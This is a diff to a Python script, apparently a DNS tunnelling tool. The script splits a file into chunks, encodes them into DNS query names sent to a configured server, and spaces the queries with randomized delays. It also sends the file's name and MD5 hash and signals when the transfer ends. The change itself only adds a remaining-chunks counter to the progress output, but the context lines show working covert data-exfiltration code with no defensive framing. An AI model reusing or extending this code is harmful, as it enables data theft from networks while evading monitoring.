@@ -30,11 +30,14 @@ def send_dns_query(data, server_ip, max_delay):
     print(f"Query sent, delaying next query by {delay:.2f} seconds.")
     time.sleep(delay)
 
-# Function to send file in chunks with randomized query sending
+# Function to send file in chunks with randomized query sending and remaining chunks counter
 def send_file_chunks(file_path, server_ip, domain, max_delay):
     file_size = os.path.getsize(file_path)
     chunk_size = 512  # Size of each chunk in bytes (adjust as needed)
     total_chunks = (file_size // chunk_size) + (1 if file_size % chunk_size else 0)
+
+    # Counter for remaining chunks
+    remaining_chunks = total_chunks
 
     with open(file_path, "rb") as file:
         for chunk_number in range(total_chunks):
@@ -43,8 +46,11 @@ def send_file_chunks(file_path, server_ip, domain, max_delay):
 
             # Use a static "chunk" prefix for all chunk queries
             query_name = f"c{chunk_number}.{encoded_chunk_data}.{domain}"
-            print(f"Sending chunk {chunk_number}")
+            print(f"Sending chunk {chunk_number}, {remaining_chunks - 1} chunks remaining.")
             send_dns_query(query_name, server_ip, max_delay)
+
+            # Decrement the remaining chunks counter
+            remaining_chunks -= 1
 
 # Function to send file information (filename and MD5 hash)
 def send_file_info(file_name, file_md5, server_ip, domain, max_delay):
@@ -71,7 +77,7 @@ def send_file(file_path, max_delay):
     # Send file info (filename and MD5 hash)
     send_file_info(file_name, file_md5, DNS_SERVER, domain, max_delay)
 
-    # Send file chunks with random delays
+    # Send file chunks with random delays and show remaining chunks
     send_file_chunks(file_path, DNS_SERVER, domain, max_delay)
 
     # Signal the end of transmission
